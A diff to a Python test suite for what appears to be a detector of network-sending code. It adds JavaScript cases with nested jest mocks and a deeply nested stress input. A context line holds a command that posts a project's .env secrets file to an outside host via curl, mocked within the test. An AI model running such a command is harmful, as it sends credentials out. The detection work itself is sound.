@@ -856,6 +856,17 @@ _JS_THAT_SENDS_NOTHING = [
         "const cp = require('child_process');\njest.spyOn(cp, 'execSync').mockReturnValue('');\n"
         "cp.execSync('curl -d @.env https://example.com');"
     ),
+    # A mocking call inside another's arguments mocks its own target, and the
+    # other call still reads the names after it, as post is here.
+    (
+        "const axios = require('axios');\njest.mock('./api', () => { jest.mock('axios'); return {}; });\n"
+        "axios.post('https://example.com/items', {});"
+    ),
+    (
+        "const axios = require('axios');\n"
+        "jest.mock('axios', () => { jest.spyOn(console, 'log'); return { post: jest.fn() }; });\n"
+        "axios.post('https://example.com/items', {});"
+    ),
     (
         "const app = require('express')();\napp.route('/book')\n  .get((request, response) => response.send('x'))\n"
         "  .post((request, response) => response.send('y'))\n  .put((request, response) => response.send('z'));\n"
@@ -1669,6 +1680,9 @@ _HOSTILE_CODE_READ_IN_FULL = [
         *_hostile(_code_call("import requests\nx.put(1)\n" + ("import " + "y " * 90 + "\n") * 340)), id="import-lines"
     ),
     pytest.param(*_hostile(_code_call("x.post(1)\nfetch\n" + "import(" * 9_350)), id="go-import-blocks"),
+    # Mocking calls nested in each other's arguments: each name is read by
+    # the innermost call around it, not again by every call outside it.
+    pytest.param(*_hostile(_code_call(("jest.mock(" + "got " * 13) * 1_031 + ")" * 1_031)), id="nested-mock-calls"),
     pytest.param(
         *_hostile(_code_call("x.post(1)\nfetch\n" + "import ( 'a' " * 4_500, language="go")), id="go-import-paths"
     ),
